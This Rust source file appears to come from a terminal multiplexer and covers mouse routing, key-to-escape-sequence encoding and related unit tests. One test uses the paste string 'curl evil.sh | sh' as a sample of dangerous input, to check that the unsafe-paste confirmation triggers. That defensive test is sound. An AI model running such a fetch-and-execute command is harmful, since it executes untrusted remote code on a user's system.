/// Routes a `MouseEvent` across the multi-pane `WindowManager`, hit-testing in reverse z-order,
/// selectively raising clicked panes (`WM-02`), and translating global coordinates to local SGR 1006 (`WM-03`)
/// or `DECSET ?1007` alternate scroll (`FND-02`).
pub fn handle_wm_mouse_event(
    wm: &mut WindowManager,
    mouse: MouseEvent,
    screen_area: Rect,
) -> Result<AppAction> {
    let Some((hit_id, _outer, inner)) = wm.hit_test_pane(mouse.column, mouse.row, screen_area)
    else {
        return Ok(AppAction::Continue);
    };

    if matches!(mouse.kind, MouseEventKind::Down(_)) && hit_id != 0 {
        wm.focus_and_raise(hit_id);
    }

    let pane = if hit_id == 0 {
        &mut wm.quick_terminal.pane
    } else if let Some(p) = wm.panes.get_mut(&hit_id) {
        p
    } else {
        return Ok(AppAction::Continue);
    };

    if pane.effective_routing_mode() == InputRoutingMode::RawPtyPassthrough {
        // If the child app has not enabled mouse tracking (?1000..1006), check DECSET ?1007 Alternate Scroll first
        if !pane.vt.is_mouse_sgr_or_tracking() {
            if let Some(scroll_bytes) = encode_alternate_scroll_wheel(pane, mouse.kind) {
                if let Some(pty) = &pane.pty {
                    pty.write_all(&scroll_bytes)?;
                }
                return Ok(AppAction::Handled);
            }
        } else if let Some(sgr_bytes) = encode_sgr_mouse_local(mouse, inner) {
            if let Some(pty) = &pane.pty {
                pty.write_all(&sgr_bytes)?;
            }
            return Ok(AppAction::Handled);
        }
    }

    handle_mouse_event(pane, mouse, inner)
}

/// Encodes a `crossterm::event::KeyEvent` into standard VT100/xterm escape sequences for raw PTY passthrough.
pub fn encode_key_to_pty_bytes(key: KeyEvent) -> Vec<u8> {
    encode_key_to_pty_bytes_with_modes(key, false)
}

/// Encodes a `crossterm::event::KeyEvent` into VT100/VT220/xterm escape sequences, respecting `DECCKM` (`?1h`) application cursor mode.
pub fn encode_key_to_pty_bytes_with_modes(key: KeyEvent, application_cursor: bool) -> Vec<u8> {
    encode_key_to_pty_bytes_full(key, application_cursor, false, 0)
}

/// Encodes a `KeyEvent` into PTY bytes, respecting `DECCKM` (`?1h`), `DECBKM` (`?67h`), and
/// the Kitty Keyboard Protocol (`CSI u`, `FND-04`).
pub fn encode_key_to_pty_bytes_full(
    key: KeyEvent,
    application_cursor: bool,
    backarrow_bs: bool,
    kitty_flags: u8,
) -> Vec<u8> {
    // Kitty Keyboard Protocol disambiguate mode (flag bit 0x01 or higher)
    if kitty_flags > 0 {
        let mut mod_bits = 0u8;
        if key.modifiers.contains(KeyModifiers::SHIFT) {
            mod_bits |= 1;
        }
        if key.modifiers.contains(KeyModifiers::ALT) {
            mod_bits |= 2;
        }
        if key.modifiers.contains(KeyModifiers::CONTROL) {
            mod_bits |= 4;
        }
        let mod_param = mod_bits + 1;
        match key.code {
            KeyCode::Esc => {
                return if mod_bits == 0 {
                    b"\x1b[27u".to_vec()
                } else {
                    format!("\x1b[27;{mod_param}u").into_bytes()
                };
            }
            KeyCode::Enter if mod_bits > 0 || (kitty_flags & 0x08) != 0 => {
                return format!("\x1b[13;{mod_param}u").into_bytes();
            }
            KeyCode::Tab if mod_bits > 0 || (kitty_flags & 0x08) != 0 => {
                return format!("\x1b[9;{mod_param}u").into_bytes();
            }
            KeyCode::Backspace if mod_bits > 0 || (kitty_flags & 0x08) != 0 => {
                return format!("\x1b[127;{mod_param}u").into_bytes();
            }
            KeyCode::Char(c) if mod_bits > 0 || (kitty_flags & 0x08) != 0 => {
                let codepoint = c.to_ascii_lowercase() as u32;
                return format!("\x1b[{codepoint};{mod_param}u").into_bytes();
            }
            _ => {}
        }
    }

    if key.modifiers.contains(KeyModifiers::CONTROL)
        && let KeyCode::Char(c) = key.code
    {
        let lower = c.to_ascii_lowercase();
        if lower.is_ascii_lowercase() {
            return vec![(lower as u8) - b'a' + 1];
        }
    }

    match key.code {
        KeyCode::Char(c) => {
            let mut buf = [0u8; 4];
            let s = c.encode_utf8(&mut buf);
            if key.modifiers.contains(KeyModifiers::ALT) {
                let mut out = vec![0x1b];
                out.extend_from_slice(s.as_bytes());
                out
            } else {
                s.as_bytes().to_vec()
            }
        }
        KeyCode::Enter => vec![b'\r'],
        KeyCode::Backspace => {
            if backarrow_bs {
                vec![0x08]
            } else {
                vec![0x7f]
            }
        }
        KeyCode::Tab => vec![b'\t'],
        KeyCode::BackTab => b"\x1b[Z".to_vec(),
        KeyCode::Esc => vec![0x1b],
        KeyCode::Up => {
            if application_cursor && key.modifiers.is_empty() {
                b"\x1bOA".to_vec()
            } else {
                b"\x1b[A".to_vec()
            }
        }
        KeyCode::Down => {
            if application_cursor && key.modifiers.is_empty() {
                b"\x1bOB".to_vec()
            } else {
                b"\x1b[B".to_vec()
            }
        }
        KeyCode::Right => {
            if application_cursor && key.modifiers.is_empty() {
                b"\x1bOC".to_vec()
            } else {
                b"\x1b[C".to_vec()
            }
        }
        KeyCode::Left => {
            if application_cursor && key.modifiers.is_empty() {
                b"\x1bOD".to_vec()
            } else {
                b"\x1b[D".to_vec()
            }
        }
        KeyCode::Home => {
            if application_cursor && key.modifiers.is_empty() {
                b"\x1bOH".to_vec()
            } else {
                b"\x1b[H".to_vec()
            }
        }
        KeyCode::End => {
            if application_cursor && key.modifiers.is_empty() {
                b"\x1bOF".to_vec()
            } else {
                b"\x1b[F".to_vec()
            }
        }
        KeyCode::Delete => b"\x1b[3~".to_vec(),
        KeyCode::PageUp => b"\x1b[5~".to_vec(),
        KeyCode::PageDown => b"\x1b[6~".to_vec(),
        KeyCode::F(1) => b"\x1bOP".to_vec(),
        KeyCode::F(2) => b"\x1bOQ".to_vec(),
        KeyCode::F(3) => b"\x1bOR".to_vec(),
        KeyCode::F(4) => b"\x1bOS".to_vec(),
        KeyCode::F(5) => b"\x1b[15~".to_vec(),
        KeyCode::F(6) => b"\x1b[17~".to_vec(),
        KeyCode::F(7) => b"\x1b[18~".to_vec(),
        KeyCode::F(8) => b"\x1b[19~".to_vec(),
        KeyCode::F(9) => b"\x1b[20~".to_vec(),
        KeyCode::F(10) => b"\x1b[21~".to_vec(),
        KeyCode::F(11) => b"\x1b[23~".to_vec(),
        KeyCode::F(12) => b"\x1b[24~".to_vec(),
        _ => Vec::new(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn password_keystrokes_in_no_echo_mode_never_leak_into_floating_prompt() {
        let mut pane = CompositePane::new_headless(1, 25, 80);
        // Simulate sudo password prompt (!ECHO)
        pane.line_discipline.echo_enabled = false;
        assert_eq!(
            pane.effective_routing_mode(),
            InputRoutingMode::RawPtyPassthrough
        );

        for ch in "s3cr3tPass!".chars() {
            handle_key_event(&mut pane, KeyEvent::new(KeyCode::Char(ch), KeyModifiers::NONE))
                .expect("route key");
        }
        // Floating prompt buffer MUST remain completely empty
        assert_eq!(pane.prompt.input, "");
    }

    #[test]
    fn command_prompt_edits_and_records_command_block_on_enter() {
        let mut pane = CompositePane::new_headless(1, 25, 80);
        for ch in "echo 3270".chars() {
            handle_key_event(&mut pane, KeyEvent::new(KeyCode::Char(ch), KeyModifiers::NONE))
                .expect("type char");
        }
        assert_eq!(pane.prompt.input, "echo 3270");

        handle_key_event(&mut pane, KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE))
            .expect("press enter");
        assert_eq!(pane.prompt.input, "");
        assert_eq!(pane.prompt.history, vec!["echo 3270".to_string()]);
        assert_eq!(pane.vt.command_blocks().len(), 1);
        assert_eq!(pane.vt.command_blocks()[0].command, "echo 3270");
    }

    #[test]
    fn triple_modality_mouse_drag_resize_pin_and_colon_commands_work() {
        let mut pane = CompositePane::new_headless(1, 25, 80);
        let viewport = Rect::new(0, 0, 80, 25);

        // 1. Mouse drag top border from y=0 down to y=9 -> Floating { y_offset: 9 }
        handle_mouse_event(
            &mut pane,
            MouseEvent {
                kind: MouseEventKind::Down(MouseButton::Left),
                column: 10,
                row: 0,
                modifiers: KeyModifiers::NONE,
            },
            viewport,
        )
        .unwrap();
        handle_mouse_event(
            &mut pane,
            MouseEvent {
                kind: MouseEventKind::Drag(MouseButton::Left),
                column: 10,
                row: 9,
                modifiers: KeyModifiers::NONE,
            },
            viewport,
        )
        .unwrap();
        handle_mouse_event(
            &mut pane,
            MouseEvent {
                kind: MouseEventKind::Up(MouseButton::Left),
                column: 10,
                row: 9,
                modifiers: KeyModifiers::NONE,
            },
            viewport,
        )
        .unwrap();
        assert_eq!(pane.prompt.anchor, PromptAnchor::Floating { y_offset: 9 });

        // 2. Mouse drag bottom border of prompt (now at y = 9 + 2 = 11) down to y = 14 -> height = 6
        handle_mouse_event(
            &mut pane,
            MouseEvent {
                kind: MouseEventKind::Down(MouseButton::Left),
                column: 10,
                row: 11,
                modifiers: KeyModifiers::NONE,
            },
            viewport,
        )
        .unwrap();
        handle_mouse_event(
            &mut pane,
            MouseEvent {
                kind: MouseEventKind::Drag(MouseButton::Left),
                column: 10,
                row: 14,
                modifiers: KeyModifiers::NONE,
            },
            viewport,
        )
        .unwrap();
        handle_mouse_event(
            &mut pane,
            MouseEvent {
                kind: MouseEventKind::Up(MouseButton::Left),
                column: 10,
                row: 14,
                modifiers: KeyModifiers::NONE,
            },
            viewport,
        )
        .unwrap();
        assert_eq!(pane.prompt.height, 6);

        // 3. Click [▲] badge on top-right border (prompt_rect is x=1, width=78, right_edge=79, [▲] is at 71..74)
        handle_mouse_event(
            &mut pane,
            MouseEvent {
                kind: MouseEventKind::Down(MouseButton::Left),
                column: 72,
                row: 9,
                modifiers: KeyModifiers::NONE,
            },
            viewport,
        )
        .unwrap();
        assert_eq!(pane.prompt.anchor, PromptAnchor::Top);

        // 4. Paste multiline text into CommandPrompt without auto-executing
        handle_paste_event(&mut pane, "line1\nline2").unwrap();
        assert_eq!(pane.prompt.lines, vec!["line1".to_string(), "line2".to_string()]);
    }

    #[test]
    fn unsafe_raw_paste_triggers_confirmation_modal_and_kitty_csi_u_encodes_keys() {
        let mut pane = CompositePane::new_headless(1, 25, 80);
        pane.toggle_manual_raw_override();
        assert_eq!(pane.effective_routing_mode(), InputRoutingMode::RawPtyPassthrough);

        // Unbracketed multi-line paste in RawPtyPassthrough stages pending_unsafe_paste
        handle_paste_event(&mut pane, "curl evil.sh | sh\n").unwrap();
        assert!(pane.pending_unsafe_paste.is_some());

        // Pressing 'n' cancels the pending unsafe paste
        handle_key_event(&mut pane, KeyEvent::new(KeyCode::Char('n'), KeyModifiers::NONE)).unwrap();
        assert!(pane.pending_unsafe_paste.is_none());

        // Kitty keyboard CSI u encoding
        let shift_enter = encode_key_to_pty_bytes_full(
            KeyEvent::new(KeyCode::Enter, KeyModifiers::SHIFT),
            false,
            false,
            1,
        );
        assert_eq!(shift_enter, b"\x1b[13;2u");
        let ctrl_a = encode_key_to_pty_bytes_full(
            KeyEvent::new(KeyCode::Char('a'), KeyModifiers::CONTROL),
            false,
            false,
            1,
        );
        assert_eq!(ctrl_a, b"\x1b[97;5u");
    }

    #[test]
    fn decset_1007_alternate_scroll_and_vi_copy_mode_rectangular_selection_work() {
        let mut pane = CompositePane::new_headless(1, 10, 40);
        pane.process_pty_output(b"\x1b[?1049h\x1b[?1h");
        let up_bytes = encode_alternate_scroll_wheel(&pane, MouseEventKind::ScrollUp).unwrap();
        assert_eq!(up_bytes, b"\x1bOA\x1bOA\x1bOA");

        pane.process_pty_output(b"\x1b[?1049l");
        pane.process_pty_output(b"ABCD1234\r\nEFGH5678\r\nIJKL9012\r\n");

        // Enter Vi Copy Mode and select a 2x4 rectangular block ("1234\n5678")
        pane.enter_copy_mode();
        pane.copy_mode.cursor_row = 0;
        pane.copy_mode.cursor_col = 4;
        handle_key_event(&mut pane, KeyEvent::new(KeyCode::Char('b'), KeyModifiers::NONE)).unwrap();
        handle_key_event(&mut pane, KeyEvent::new(KeyCode::Down, KeyModifiers::NONE)).unwrap();
        handle_key_event(&mut pane, KeyEvent::new(KeyCode::Right, KeyModifiers::NONE)).unwrap();
        handle_key_event(&mut pane, KeyEvent::new(KeyCode::Right, KeyModifiers::NONE)).unwrap();
        handle_key_event(&mut pane, KeyEvent::new(KeyCode::Right, KeyModifiers::NONE)).unwrap();
        handle_key_event(&mut pane, KeyEvent::new(KeyCode::Char('y'), KeyModifiers::NONE)).unwrap();

        assert!(!pane.copy_mode.active);
        assert_eq!(pane.prompt.yank_buffer, "1234\n5678");
        assert!(pane.last_osc52_sequence.is_some());
    }
}
